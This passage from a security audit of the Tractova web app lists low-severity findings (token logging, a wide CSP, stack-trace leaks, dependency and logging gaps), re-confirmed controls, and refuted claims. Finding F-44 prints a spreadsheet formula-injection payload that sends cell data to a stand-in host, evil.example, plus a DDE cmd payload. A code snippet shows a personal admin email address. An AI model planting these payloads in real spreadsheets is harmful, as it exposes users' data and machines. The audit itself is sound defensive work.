- **Location:** [scripts/probe-axiom.mjs:68](../scripts/probe-axiom.mjs)

**Evidence** (line 68):
```js
console.log(`  token: ${TOKEN.slice(0, 8)}…${TOKEN.slice(-4)} (${TOKEN.length} chars)`)
```

**Exploit scenario (Tractova-specific):** The local probe prints the first 8 and last 4 characters of `AXIOM_TOKEN` to the terminal, so the partial token lands in shell history/scrollback and any pasted terminal output — the exact leak channel the 05-31 L2 rule ("log presence+length, never a prefix") was written to close; `api/lib/_axiomLog.js:69-71` follows the rule correctly. Blast radius is small (local-only, ingest-only token), but 12 known characters materially shrink the brute/confirm space if combined with another partial exposure, and the script predates the rule.

**Proposed fix:** Replace line 68 with the compliant shape used in `_axiomLog.js:71`: `console.log(\`  token: set (${TOKEN.length} chars)\`)`.

- **Effort:** S
- **Verification:** Re-read all of `probe-axiom.mjs` — line 68 does print `TOKEN.slice(0,8)+slice(-4)`, and `_axiomLog.js:70-71` confirms the project rule is presence+length only; severity stays Low because the token is ingest-only and exposure requires the operator to paste terminal output.

---

## [F-14] CSP `img-src 'self' data: https:` allows any HTTPS host — exfiltration/tracking channel — Low · open

- **OWASP / CWE:** A05 Security Misconfiguration / CWE-1021 (Improper Restriction of Rendered UI Layers)
- **Location:** [vercel.json:17](../vercel.json)

**Evidence** (CSP fragment, line 17):
```
img-src 'self' data: https:; … connect-src 'self' https://*.supabase.co https://api.anthropic.com … https://cdn.jsdelivr.net …
```

**Exploit scenario (Tractova-specific):** `img-src` permits images from any HTTPS host, so any HTML/SVG/markdown an attacker can land in the DOM (a future AI-rendered field or a stored value) can beacon to an arbitrary server via an `<img>` request — a covert exfil/tracking channel the otherwise-tight `connect-src` allow-list would block. Today Tractova renders no untrusted HTML (no `dangerouslySetInnerHTML` anywhere in `src/`), so there is no active injection sink — hence Low. It is a residual hardening gap: the rest of the CSP is strict (`default-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`) while `img-src` is wide open.

**Proposed fix:** Tighten `img-src` to hosts actually used: `img-src 'self' data: https://www.tractova.com` (plus any specific CDN if og/map tiles need one). The app loads only local favicons/og images and `data:` URIs, so the wildcard is unnecessary.

- **Effort:** S
- **Verification:** Verified `vercel.json:17` contains `img-src 'self' data: https:` inside an otherwise-strict CSP; a sink sweep found zero `dangerouslySetInnerHTML`/`innerHTML`, no markdown renderer dep, and in fact zero remote `<img>` loads — so the broad allowance serves no functionality and can be tightened for free.

---

## [F-15] API error handlers return `err.message` and truncated stack traces to clients on 500 — Low · open

- **OWASP / CWE:** A05 Security Misconfiguration / CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Location:** [api/refresh-ix-queue.js:66-70](../api/refresh-ix-queue.js)

**Evidence** (re-read verbatim, lines 66-70):
```js
    return res.status(500).json({
      error: err?.message || String(err),
      where: 'refresh-ix-queue',
      stack: err?.stack?.split('\n').slice(0, 4).join(' | '),
    })
```

**Exploit scenario (Tractova-specific):** Five serverless handlers return the raw exception message **and** the first 4 stack frames in the 500 JSON body: `refresh-ix-queue.js:66-70`, `refresh-substations.js:227-231`, `refresh-capacity-factors.js:88-92`, plus `webhook.js:169-172` and `send-digest.js:201-204` / `send-alerts.js:368-371` echo `err.message`. The cron-refresh handlers have no HTTP method filter, so any verb passing auth reaches them; an admin or anyone who can trigger an error sees absolute file paths, function names, and internal module structure (e.g. `/var/task/api/scrapers/_refresh-nj-dg.js`, line numbers), aiding targeting of the workbook-parse and SSRF surfaces. Auth-gated (CRON_SECRET / admin JWT), so impact is Low — but the leak is inconsistent with the silent `{fallback:true}` shape used by lens-insight and the generic "Internal server error" used by `data-health.js:143`.

**Proposed fix:** Drop the `stack` field from all client-facing 500 responses and return a generic message (`{ error: 'Internal server error' }`); keep the full `err.message`/stack only in the server-side `axiomLog`/`console.error` calls (which already capture it). Patch the three cron-refresh catch blocks and the webhook/send-* 500 returns to mirror `data-health.js:143`.

- **Effort:** S
- **Verification:** Verified `refresh-ix-queue.js:66-70` (plus the two sibling refresh handlers) return `err.message` + 4 stack frames; the catch wraps `handlerInner` whose first action is the auth gate and all pre-auth code is provably non-throwing, so only CRON_SECRET/admin/Vercel-cron principals see the leak — real but Low.

---

## [F-16] Supabase client uses the default implicit flow with `detectSessionInUrl` — tokens land in the URL fragment — Low · open

- **OWASP / CWE:** A05 Security Misconfiguration / CWE-598 (Use of GET Request with Sensitive Query Strings — applied to fragment-borne tokens)
- **Location:** [src/lib/supabase.js:19-22](../src/lib/supabase.js)

**Evidence** (re-read verbatim, lines 19-22):
```js
export const supabase = createClient(
  supabaseUrl     ?? 'https://placeholder.supabase.co',
  supabaseAnonKey ?? 'placeholder'
)
```

**Exploit scenario (Tractova-specific):** With no auth options, supabase-js defaults to `flowType:'implicit'` and `detectSessionInUrl:true`. In the implicit flow, email-confirmation and password-recovery callbacks deliver the access/refresh tokens in the URL fragment (`#access_token=…`). Fragments aren't sent to servers but are exposed to any client-side script, browser history, and referrer-leakage paths; PKCE is the hardened alternative that exchanges a one-time `?code=` instead. The app uses `resetPasswordForEmail` (`SignIn.jsx:42`), so recovery tokens do transit the fragment. Real exploitation needs another XSS or a malicious extension, so this is defense-in-depth — but PKCE is the recommended SPA posture and removes the token-in-URL window.

**Proposed fix:** Pass explicit auth options: `{ auth: { flowType: 'pkce', detectSessionInUrl: true, autoRefreshToken: true, persistSession: true } }`, and verify the Supabase dashboard email/recovery templates use the `?code=` (PKCE) callback format.

- **Effort:** M
- **Verification:** Re-read supabase.js (no auth options), the auth-js defaults (`detectSessionInUrl:true`, `flowType:'implicit'`), and confirmed the fragment flow is live (`SignIn.jsx:42` sends recovery, `UpdatePassword.jsx` consumes `#access_token=…&type=recovery`); the CSP blunts the XSS prerequisite and the library clears the hash after consumption, so Low.

---

## [F-17] Map topojson fetched at runtime from `cdn.jsdelivr.net` with floating version tags — Low · open

- **OWASP / CWE:** A06 Vulnerable & Outdated Components / CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Location:** [src/components/USMap.jsx:5](../src/components/USMap.jsx) (also `LibraryMap.jsx:31`, `DashboardGlobe.jsx:49-51`)

**Evidence** (snippet):
```js
const GEO_URL = 'https://cdn.jsdelivr.net/npm/us-atlas@3/states-10m.json'
// DashboardGlobe.jsx:49-51:
const WORLD_URL  = 'https://cdn.jsdelivr.net/npm/world-atlas@2/land-110m.json'
const STATES_URL = 'https://cdn.jsdelivr.net/npm/us-atlas@3/states-10m.json'
```

**Exploit scenario (Tractova-specific):** Three production components fetch geographic topojson into every user's browser from jsdelivr at render time, using floating tags (`@3`, `@2`) — so any future `us-atlas` 3.x / `world-atlas` 2.x publish, or a jsdelivr compromise, is served to all users immediately with no lockfile/integrity protection (`world-atlas` isn't even a declared dependency). `script-src` excludes jsdelivr so this is not code execution, but an attacker who compromises either package or the CDN can deface/corrupt the core map surfaces (data-legitimacy *is* the product), and the blanket `connect-src` allowance for the whole `cdn.jsdelivr.net` host is a standing CSP hole. Ironically, `us-atlas@3.0.1` is already installed and lockfile-pinned but unused at runtime.

**Proposed fix:** Vendor the data — `import statesTopo from 'us-atlas/states-10m.json'` (and add `world-atlas` as a pinned devDep with a build-time copy), pass the imported object to `<Geographies geography={statesTopo}>` in the three components, then delete `https://cdn.jsdelivr.net` from `connect-src`. Bundle cost ~+90 KB gzip per (already lazy-split) map chunk.

- **Effort:** S
- **Verification:** Re-read the three components, `vercel.json:17`, and the lockfile — runtime CDN fetches with floating tags, the `connect-src` allowance, and the installed-but-unused pin are all real; `USMap.jsx` is itself dead code and the feeds drive only canvas/SVG attributes (no innerHTML sink), so a low-likelihood upstream-publish risk remains.

---

## [F-18] Unused/misplaced runtime dependencies: `shadcn` CLI and `cobe` never imported; `us-atlas` dev-only; `radix-ui` meta-package for one `Slot` import — Low · open

- **OWASP / CWE:** A06 Vulnerable & Outdated Components / CWE-1104 (Use of Unmaintained Third-Party Components — applied to attack-surface bloat)
- **Location:** [package.json:42,45,51,56](../package.json)

**Evidence** (snippet):
```json
"cobe": "^2.0.1",       // zero imports in src/api/scripts (comment-only refs)
"radix-ui": "^1.4.3",   // used ONLY for { Slot } in src/components/shadcn/ui/badge.jsx:2
"shadcn": "^4.7.0",     // CLI tool as runtime dep; zero imports anywhere
"us-atlas": "^3.0.1",   // only scripts/generate-county-centroids.mjs:40 reads it (dev-time)
```

**Exploit scenario (Tractova-specific):** `shadcn` is a code-generator CLI, not a library — installed as a production dependency with zero imports it contributes nothing but a large transitive tree to every `npm ci` (including `msw`, one of only 3 lockfile packages with an install lifecycle script). `cobe` (WebGL globe) has zero imports — `DashboardGlobe.jsx:17` notes it was replaced by a hand-rolled canvas. Each dead package is standing exposure: a future compromised release is auto-pulled by Dependabot minor/patch bumps and shipped through CI despite the code never importing it. Both packages were verified genuine on the registry — this is attack-surface bloat, not typosquatting.

**Proposed fix:** `npm uninstall shadcn cobe radix-ui`; move `us-atlas` to `devDependencies` (only consumer is `scripts/generate-county-centroids.mjs:40` — unless the F-17 fix bundles it, in which case keep it in `dependencies`); in `badge.jsx` replace `import { Slot } from "radix-ui"` with `import { Slot } from "@radix-ui/react-slot"` and add `@radix-ui/react-slot` (~3 KB). Update the `dependabot.yml` shadcn ignore-rule and its stale "4 root advisories" comment (allowlist now has 3).

- **Effort:** S
- **Verification:** Verified every claim against `package.json:42,45,51,56` and the lockfile — `cobe`/`shadcn` have zero imports, `us-atlas` is read only by a dev script, `radix-ui`'s sole import is in `badge.jsx` which is itself imported nowhere; `shadcn` pulling `msw` confirmed in the lockfile.

---

## [F-19] No lockfile-tamper or malicious-package gate: `lint-secrets` skips `.lock`, no resolved-host lint, no typosquat/OSV scan, moderate advisories never gate — Low · open

- **OWASP / CWE:** A06 Vulnerable & Outdated Components / CWE-494 (Download of Code Without Integrity Check)
- **Location:** [scripts/lint-secrets.mjs:56-60](../scripts/lint-secrets.mjs)

**Evidence** (snippet):
```js
const SKIP_EXT = /\.(lock|log|snap|png|jpg|jpeg|gif|pdf|csv|xlsx|zip|woff2?|ttf|otf|ico)$/i
// + line 92: files > 2MB skipped
```

**Exploit scenario (Tractova-specific):** Today the lockfile is clean (all packages resolve to `registry.npmjs.org` with integrity hashes, install scripts only on `fsevents` ×2 and `msw`). But no gate keeps it that way: a single-commit edit pointing one `resolved` URL at an attacker host (the classic unreviewable-lockfile-diff vector, e.g. via compromised tooling or an AI-generated commit) would be installed verbatim by `npm ci` in CI and the Vercel build — `npm ci` validates integrity *against the lockfile*, not against the registry. `lint:secrets` skips `.lock` and > 2 MB files; `audit-check.mjs` consumes only npm-registry advisories (no malicious-package/typosquat detection); moderate/low advisories never fail CI by design.

**Proposed fix:** Add to CI after `npm ci`: `npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm --validate-https --validate-integrity` (fails on any non-`registry.npmjs.org` resolved URL), plus a weekly `google/osv-scanner-action` job scanning `package-lock.json`. Both are zero-config given the current clean lockfile. (Exact YAML belongs in the guardrails doc.)

- **Effort:** S
- **Verification:** Re-read `lint-secrets.mjs:25-66,79-95` — one snippet detail in the source brief was wrong (`package-lock.json` is *not* excluded by `SKIP_EXT` and is under 2 MB), but it doesn't refute the finding because `SECRET_PATTERNS` only match key shapes, never resolved-host URLs, so the scan that runs is blind to lockfile tampering; `audit-check.mjs` gates only unallowlisted high/critical advisories.

---

## [F-20] Security-critical dependencies caret-ranged with no `.npmrc`; lockfile authority in the Vercel deploy not pinned in repo config — Low · open

- **OWASP / CWE:** A06 Vulnerable & Outdated Components / CWE-1357 (Reliance on Insufficiently Trustworthy Component)
- **Location:** [package.json:30,39,52,57](../package.json)

**Evidence** (snippet):
```json
"@anthropic-ai/sdk": "^0.95.1",
"@supabase/supabase-js": "^2.105.3",
"stripe": "^22.1.1",
"xlsx": "^0.18.5",
// vercel.json:2 sets buildCommand only — no installCommand
```

**Exploit scenario (Tractova-specific):** Every dependency, including the four security-critical ones (payments, auth/DB client, AI SDK, the already-vulnerable xlsx), uses a caret range. The committed lockfile + `npm ci` in CI makes CI deterministic, but `vercel.json` declares no `installCommand`, so whether the production build honors the lockfile strictly (`npm ci`) or can drift within caret ranges (`npm install` re-resolution if package.json and lockfile disagree) is decided by an **out-of-repo Vercel setting**. There is also no `.npmrc`, so a future `npm install <pkg>` adds another caret by default, and lifecycle scripts run unrestricted at install time. A malicious patch release inside a caret range reaches the build only via a lockfile update — low likelihood, but exact pins shrink the window and make bumps deliberate.

**Proposed fix:** (1) Add `"installCommand": "npm ci"` to `vercel.json` so the prod build is lockfile-authoritative by config. (2) Add a repo-root `.npmrc` with `save-exact=true`. (3) Pin the four security-critical deps exactly in `package.json`. Dependabot's weekly grouped PR still proposes bumps for exact pins, so the update flow is unchanged.

- **Effort:** S
- **Verification:** Verified `package.json:30,39,52,57` caret ranges with no `overrides`, no `.npmrc` (Glob), and `vercel.json:2` setting only `buildCommand`; compensating controls (committed lockfile, `npm ci` in CI, audit gate) are real but partial — GitHub Actions does not block Vercel's git-triggered build.

---

## [F-21] Authorization DENIALS and rate-limit trips are never logged to any queryable store — Low · open

- **OWASP / CWE:** A09 Security Logging & Monitoring Failures / CWE-778 (Insufficient Logging)
- **Location:** [api/lens-insight.js:333-381](../api/lens-insight.js)

**Evidence** (snippet):
```js
if (!user || authErr) return res.status(401).json({ error: 'Unauthorized' })
…
if (!isPro) return res.status(403).json({ error: 'Pro subscription required' })
…
if (recentCalls.length >= RL_SUSTAINED_PER_HOUR) {
  return res.status(429).json({ error: 'Rate limit exceeded', reason: 'sustained_per_hour', … })
```

**Exploit scenario (Tractova-specific):** Across every api handler, an authz failure (401 invalid/missing JWT, 403 not-Pro, 403 admin-required, 401 cron-secret mismatch) returns a status code and nothing else — no `axiomLog`, no `api_call_log` row, no `cron_runs` row. The lens-insight 429 trips return without recording. `logRateLimited` fires only on the admin alert-test path and on successful checkout, never on a denial; `axiomLog` is wired only into uncaught-500 paths. Result: a credential-stuffing run, a free user probing Pro endpoints, or CRON_SECRET-guessing produces a storm of 401/403/429s that exist only in Vercel's ~1-hour runtime log tail (Hobby) and then vanish — no durable signal an on-call human or a monitor could query.

**Proposed fix:** Add a lightweight durable security-event log: a `security_events` table (`event_type, route, user_id-nullable, ip-from-x-forwarded-for, reason, created_at`, RLS deny-all like `api_call_log`) plus a shared `logSecurityEvent()` helper called on every 401/403/429 return and on each cron-secret mismatch. At minimum, `await axiomLog('warn', …)` on these denial branches so they reach the existing Axiom dataset. Then an Axiom monitor can alert on a denial spike.

- **Effort:** M
- **Verification:** Re-read `lens-insight.js:301-430` (401/403/429 all return with no logging; `api_call_log` inserts fire only after every gate passes), `_rate-limit.js:70-87` (logs only successful calls), and the cron-secret 401 paths — confirmed no denial signal reaches any durable store.

---

## [F-22] Vercel runtime-log retention is ~1h on Hobby and Axiom captures only explicitly-instrumented events — Low · open

- **OWASP / CWE:** A09 Security Logging & Monitoring Failures / CWE-778 (Insufficient Logging)
- **Location:** [api/lib/_axiomLog.js:24-29](../api/lib/_axiomLog.js)

**Evidence** (comment, lines 24-29):
```js
// Why HTTPS-direct instead of Vercel Log Drains: Log Drains require
// the Vercel Pro tier. … we only capture events we explicitly instrument;
// unhandled exceptions caught by Vercel's runtime layer are still only
// visible in the Vercel function-log tail (~1 hour retention on Hobby).
```

**Exploit scenario (Tractova-specific):** Axiom forwarding is a silent no-op when `AXIOM_TOKEN`/`AXIOM_DATASET` are unset, and even when set it captures only the handful of `axiomLog`/`logAndRespond500` callsites (all 500-class). Everything else — rate-limit fail-open, dedup-probe failures, cron-insert failures, snapshot failures, and all 4xx denials — lives only in the ~1-hour Vercel tail with no Log Drain. After an incident older than ~1 hour, there is nowhere to look for anything that wasn't one of the ~10 instrumented events. (Note: four durable Supabase ledgers — `cron_runs`, `api_call_log`, `admin_audit_log`, `webhook_events_processed` — *do* cover cron failures, paid-call abuse, and billing forensics, so "nowhere to look" is partly overstated; what genuinely vanishes is the 4xx-denial and uninstrumented-error class.)

**Proposed fix:** Document the retention reality in an ops runbook and route security-relevant events (denials, rate-limit trips, webhook sig failures, cron-secret mismatches) through `axiomLog` so they land in Axiom (retained per Axiom plan) rather than the 1h tail. **Confirm `AXIOM_TOKEN`/`AXIOM_DATASET` are actually set in Vercel Production** — if unset, all forwarding is currently a no-op (see unverified list). The one-time `[axiom]` init diagnostic was supposed to be removed after confirming production is wired; its presence suggests confirmation may be stale.

- **Effort:** S
- **Verification:** Re-read `_axiomLog.js` in full (line 78 silent no-op; the 24-29 comment verbatim), all 10 callsites, and the runbook — the auditor missed four durable Supabase ledgers, so cron-failure records *are* durable; what survives the finding is the 4xx-denial/uninstrumented-error class.

---

## [F-23] No automated alerting on security anomalies; the only monitor is the weekly data-staleness email — Low · open

- **OWASP / CWE:** A09 Security Logging & Monitoring Failures / CWE-778 (Insufficient Logging)
- **Location:** [api/check-staleness.js:148-173](../api/check-staleness.js)

**Evidence** (snippet, lines 148-150):
```js
if (results.issues.length > 0 && RESEND_API_KEY) {
  … await fetch('https://api.resend.com/emails', { … to: ADMIN_EMAIL … })
  results.emailSent = true
```

**Exploit scenario (Tractova-specific):** The only proactive alert is `check-staleness`'s weekly email, which fires on **data age** and cron-failure status — not on any security signal. `cronLatencyMonitor.js` is a client-side admin-tab display, not an alerter; nobody is paged when it goes red. There is zero detection for: repeated authz denials, rate-limit storms, Stripe webhook signature failures (axiomLog'd but no monitor reads Axiom), a cron silently dying between weekly runs, or an Anthropic spend spike from a leaked Pro JWT abusing `/api/lens-insight` (and fail-open during a Supabase blip removes even the 60/hr cap). For a one-person team, an attack would run unnoticed until the next weekly email or the Anthropic/Stripe bill.

**Proposed fix:** Stand up 5 cheap alerts on the current Resend+Axiom+Supabase stack: (1) Axiom monitor on `route=api/webhook` "signature failed" events; (2) Axiom monitor on a count threshold of the new `security_events` denial type (F-21); (3) cron silent-death — extend `check-staleness` to alert if any pillar cron has no success row in 2× its interval; (4) Anthropic spend — schedule `scripts/check-api-usage.mjs` to email when `api_call_log` count/24h exceeds a budget; (5) an Anthropic Console hard spend cap as a backstop.

- **Effort:** M
- **Verification:** Re-read `check-staleness.js:89-225` — the email fires only on data-age thresholds and failed cron rows, weekly; a missed compensating control (`data-health.js` health-summary) returns only coverage/freshness, zero security signals, so the gap stands.

---

## [F-24] `check-staleness` performs unguarded weekly DELETEs on `cron_runs` and `data_updates` — observability history self-prunes with no backup — Low · open

- **OWASP / CWE:** A09 Security Logging & Monitoring Failures / CWE-212 (Improper Removal of Sensitive Information Before Storage/Transfer)
- **Location:** [api/check-staleness.js:187-208](../api/check-staleness.js)

**Evidence** (snippet):
```js
const { count: deletedUpdates } = await supabaseAdmin
  .from('data_updates').delete({ count: 'exact' }).lt('updated_at', oneYearAgo)
const { count: deletedRuns } = await supabaseAdmin
  .from('cron_runs').delete({ count: 'exact' }).lt('created_at', sixMonthsAgo)
```

**Exploit scenario (Tractova-specific):** Every weekly run hard-DELETEs `cron_runs` older than 6 months and `data_updates` older than 1 year, with no archival, no dry-run, and no guard. `cron_runs` is the de-facto security/operational log (read by `probe-cron-runs.mjs` and the Data Health tab). Combined with the absent `admin_audit_log` writes (F-06) and the 1h Vercel retention (F-22), the longest-lived forensic window for cron-driven data changes caps at 6 months and shrinks automatically; a `data_updates` change record (the only trail for some admin edits) is gone after 1 year. If an incident is discovered late, the evidence may already be pruned. The DELETE is irreversible (no soft-delete), on a service-role client that bypasses RLS.

**Proposed fix:** Before pruning, export the to-be-deleted rows to cold storage (a `cron_runs_archive` table or a JSON snapshot) so observability history survives. At minimum extend `cron_runs` retention to your incident-response window (12+ months) and gate the prune behind a row-count sanity check (abort if it would delete more than N% of the table — a cutoff-computation bug could otherwise wipe everything). Record prune counts to `admin_audit_log`/`security_events` so the deletion itself is auditable.

- **Effort:** S
- **Verification:** Re-read `check-staleness.js:89-225` — the DELETEs are exactly as reported, behind a timing-safe CRON_SECRET gate (not attacker-controllable, so the "destroy fresh evidence" framing is overstated); `data_updates` is absent from the manual snapshot script's TABLES list, so its field-level change history is the one trail with no backup.

---

## [F-25] Legacy admin-email fallback still live in `is_admin()` and `isAdminFromBearer` past the rollout window — Low · 📋 documented-accepted

- **OWASP / CWE:** A01 Broken Access Control / CWE-798 (Use of Hard-coded Credentials)
- **Location:** [api/_admin-auth.js:60-64](../api/_admin-auth.js)

**Evidence** (re-read verbatim, lines 60-64):
```js
  // Legacy fallback: email match. Active during the migration-057 rollout
  // window only; remove after verifying role data is populated.
  if (user.email === LEGACY_ADMIN_EMAIL) {
    return { ok: true, user, role: 'admin', email: user.email, _legacyFallback: true }
  }
```

**Exploit scenario (Tractova-specific):** Both the application admin gate (fires when the `profiles.role` lookup errors entirely) and the DB helper `public.is_admin()` (`058_rls_role_based_hardening.sql:66`, an unconditional `OR (auth.jwt()->>'email'='aden.walker67@gmail.com')`) keep a hardcoded email as a live admin trust anchor. **Not exploitable by a non-admin** — Supabase verifies the JWT email and the 071 trigger blocks role self-escalation — so there is no adversarial path today. The risk is regression/operational: admin is keyed off a literal in two layers, the migration-057 rollout is long complete (the comment says remove after verifying), and a future admin-email change would still grant admin via this clause regardless of `profiles.role`.

**Acceptance rationale & status:** CLAUDE.md §9 and the code comments document keeping the fallback through the 057 rollout. The rollout is complete, so this accepted item is now **overdue for cleanup** rather than a standing acceptance.

**Proposed fix:** After confirming live that the admin profile has `role='admin'` populated (manual check in `04-unverified`), drop the email fallback: remove the `if (user.email === LEGACY_ADMIN_EMAIL)` block (and the `LEGACY_ADMIN_EMAIL` const), and in a new migration replace `is_admin()`'s body with `select coalesce((select role='admin' from profiles where id=auth.uid()), false);` (dropping the `or (auth.jwt()->>'email'=…)` clause).

- **Effort:** S
- **Revisit:** Now (rollout complete) — clear once the live role-populated check passes.

---

## [F-26] Server XLSX scrapers read the entire fetched workbook into memory with no byte cap — Low · 📋 documented-accepted

- **OWASP / CWE:** A08 Software & Data Integrity Failures / CWE-409 (Improper Handling of Highly Compressed Data / decompression bomb)
- **Location:** [api/scrapers/_refresh-nj-dg.js:112-121](../api/scrapers/_refresh-nj-dg.js)

**Evidence** (snippet):
```js
const res = await fetch(edc.url, { … signal: signal || AbortSignal.timeout(40000) })
if (!res.ok) throw new Error(`${edc.utility_name} xlsx fetch failed: ${res.status}`)
const buf = Buffer.from(await res.arrayBuffer())   // no Content-Length / byte cap
const XLSX = await import('xlsx')
const wb = XLSX.read(buf, { type: 'buffer' })
```

**Exploit scenario (Tractova-specific):** The four DG scrapers (`_refresh-nj-dg.js`, `_refresh-md-dg.js`, `_refresh-va-dg.js`, `_refresh-ca-dg.js`) buffer the full HTTP response and call `XLSX.read` with no size limit. If an upstream utility/.gov source is compromised or MITM'd (the precondition already accepted for the xlsx advisories in `audit-allowlist.json`), it can serve a multi-GB or zip-bomb workbook, OOM-killing or timing out the 300s refresh function. Scope re-verification: `XLSX.read` appears **only** in these 4 server scrapers — WI uses a CSV parser, NY uses SODA JSON, and the manual IX upload (`_refresh-ix-manual.js`) is TEXT-only with a 2 MB cap; no new `XLSX.read` callsite has appeared since 2026-05-31.

**Acceptance rationale & status:** Bundled under the xlsx allowlist acceptance (prototype-pollution + ReDoS, `review_due` 2026-08-06; exceljs migration Q3 2026). The byte-cap gap is a small addition to that same accepted item.

**Proposed fix:** Before buffering, enforce a byte cap: check `res.headers.get('content-length')` and reject over a threshold (e.g. 25 MB — utility queue workbooks are < 5 MB), and stream-read with a running-size guard that aborts past the cap rather than calling `arrayBuffer()` unbounded. Fold this note into the existing xlsx allowlist rationale.

- **Effort:** S
- **Revisit:** 2026-08-06 (with the xlsx allowlist review) / exceljs migration Q3 2026.

---

## [F-44] Library XLSX/CSV export writes unsanitized cell values — spreadsheet formula injection — Low · open

*(Added during the completeness pass — the hunter sweep covered email-template and HTTP-header injection but not export-cell formula injection.)*

- **OWASP / CWE:** A03 Injection / CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
- **Location:** [src/lib/exportHelpers.js:41-74](../src/lib/exportHelpers.js)

**Evidence** (re-read verbatim, row builder at lines 41-72):
```js
return [
  p.name,                       // user-entered → written raw to a cell
  p.stateName || p.state,
  p.county,
  …
  p.servingUtility || '',       // user-entered
  …
  ixNotes,                      // from state_programs (admin/scraped — shared across users)
  alerts,
```

**Exploit scenario (Tractova-specific):** `buildExportRows` feeds these values into `XLSX.utils.aoa_to_sheet` with no formula-prefix neutralization. A cell whose text begins with `=`, `+`, `-`, `@`, or a tab/CR is executed as a formula when the workbook opens in Excel / Google Sheets / LibreOffice. `name` and `servingUtility` are the user's own input (self-injection — limited blast radius), but `ixNotes` originates from the shared `state_programs` table (admin-curated / scraper-sourced), so one poisoned upstream or admin value rides into **every** user's export for that state. A classic payload — `=HYPERLINK("https://evil.example/?x="&A1&B1,"open")` exfiltrates adjacent cells when clicked, or legacy `=cmd|'/c calc'!A1` DDE prompts for command execution on over-permissive Excel installs. For a product whose core workflow is "export your deal pipeline to Excel," this is a realistic client-side vector that also undercuts the trust-first positioning.

**Proposed fix:** Neutralize formula-leading cells at the export boundary in `exportHelpers.js`:
```js
const sanitizeCell = (v) =>
  (typeof v === 'string' && /^[=+\-@\t\r]/.test(v)) ? `'${v}` : v   // prefix-quote, the standard CSV-injection guard
```
Map every string field in the `buildExportRows` return through `sanitizeCell` (and any non-literal cell in the methodology/glossary sheet builders). Prefix-quoting is preferred over stripping so legitimate values (a utility literally named "-", a note starting with "+") still render readably. Add a unit test asserting a `=`/`+`/`@`-leading input is quoted in the output row.

- **Effort:** S
- **Verification:** Re-read `exportHelpers.js:21-76` — every string field (`p.name`, `p.county`, `p.servingUtility`, `ixNotes`, `alerts`) is pushed into the `aoa_to_sheet` row with no prefix guard; the `num()` helper guards numerics only. `XLSX.writeFile` is the write path (prototype-pollution-on-read does not apply), but formula injection is a write-side property of the cell content, so it stands.

---

## 3 — Verified Controls (prior fixes re-confirmed INTACT)

These 17 items were re-checked against the live tree and the 2026-05-31 audit fixes. All held — listed here to build confidence in the unchanged surfaces. No action required.

| # | Control | File | Status |
|---|---|---|---|
| F-27 | No real secret ever committed (882-commit gitleaks scan); clean client bundle; server-only keys never in `src/` | [scripts/lint-secrets.mjs](../scripts/lint-secrets.mjs) | **INTACT** |
| F-28 | d3-color ReDoS allowlist rationale accurate (numeric-only interpolation; one undocumented consumer noted) | [scripts/audit-allowlist.json](../scripts/audit-allowlist.json) | **INTACT** |
| F-29 | C1 — `profiles` privileged-column BEFORE-UPDATE trigger (071) byte-identical; not weakened by 073-081 | [supabase/migrations/071_profiles_privileged_column_guard.sql](../supabase/migrations/071_profiles_privileged_column_guard.sql) | **INTACT** |
| F-30 | Projects UPDATE `WITH CHECK` (072) — ownership reassignment still blocked | [supabase/migrations/072_projects_update_with_check.sql](../supabase/migrations/072_projects_update_with_check.sql) | **INTACT** |
| F-31 | C4+L3 — `CRON_SECRET` gates with `timingSafeEqualStr` on all 8 cron/utility endpoints; `x-vercel-cron` never trusted when the secret is set | [api/refresh-data.js](../api/refresh-data.js) | **INTACT** |
| F-32 | Admin-vs-Pro gates — `isAdminFromBearer` on URL-classify actions and the new `ix_manual` CSV upload | [api/lens-insight.js](../api/lens-insight.js) | **INTACT** |
| F-33 | I1 — SSRF guard (`_urlFetch.js`) intact; still the only path for variable-URL server fetches | [api/lib/_urlFetch.js](../api/lib/_urlFetch.js) | **INTACT** |
| F-34 | Slack-webhook SSRF guard — exact-host allowlist server-side + write-side validation | [api/send-alerts.js](../api/send-alerts.js) | **INTACT** |
| F-35 | C3 — CORS allow-list, no wildcard, no reflected-origin path added since 05-31 | [api/_cors.js](../api/_cors.js) | **INTACT** |
| F-36 | L1 — Stripe redirect validation on both checkout and portal | [api/create-checkout-session.js](../api/create-checkout-session.js) | **INTACT** |
| F-37 | Stripe webhook — raw-body signature verify + dedup + `client_reference_id` validation | [api/webhook.js](../api/webhook.js) | **INTACT** |
| F-38 | `markdownRender` href scheme allowlist (XSS defense-in-depth) | [src/lib/markdownRender.jsx](../src/lib/markdownRender.jsx) | **INTACT** |
| F-39 | HIBP leaked-password check wired on both SignUp and UpdatePassword | [src/pages/SignUp.jsx](../src/pages/SignUp.jsx) | **INTACT** |
| F-40 | D1 — `send-alerts` logs keyed by `profile.id`; no email in event logs or Axiom metadata | [api/send-alerts.js](../api/send-alerts.js) | **INTACT** |
| F-41 | Security headers (CSP/HSTS/COOP/CORP/X-Frame) unchanged; only a cron `maxDuration` bump touched `vercel.json` | [vercel.json](../vercel.json) | **INTACT** |
| F-42 | Dependency + secret-scan gates — `lint:audit` green (3 allowlisted, 0 new high+), `lint:secrets` clean, both in verify chain + CI + pre-commit | [package.json](../package.json) | **INTACT** |
| F-43 | Post-05-31 code (Phases 2-4 + `_prompts` rename) complies with the established controls | [api/handlers/_tract-resolve.js](../api/handlers/_tract-resolve.js) | **INTACT** |

---

## 4 — Appendix: Refuted During Verification

Seven hunter-flagged items were investigated and **dropped** — included for process honesty.

| Refuted claim | One-line refutation |
|---|---|
| hCaptcha silently falls back to the universal TEST sitekey when the env var is unset | The client sitekey is UI-only; captcha is enforced server-side by Supabase Auth against a secret in the dashboard, so a missing client var doesn't weaken the gate. |
| Email HTML templates interpolate untrusted DB fields with no escaping (cross-user via scraper headline) | The unescaped interpolation is real, but `s.headline` is sourced only from a `news_feed` query populated from four hardcoded https trade-press feeds — the claimed user-controlled path is dead. |
| DB-sourced URLs rendered into `href` with no scheme allowlist across ~12 components | `news_feed.url` is written only by `supabaseAdmin` from four hardcoded https feeds; no user-write path reaches the rendered `href`. |
| `refresh-ix-queue` / `refresh-substations` accept ANY HTTP method (no method filter) | The missing method filter is true, but `handlerInner`'s first statement is a method-agnostic auth gate (CRON_SECRET or admin-role), so no unauthenticated verb gets through. |
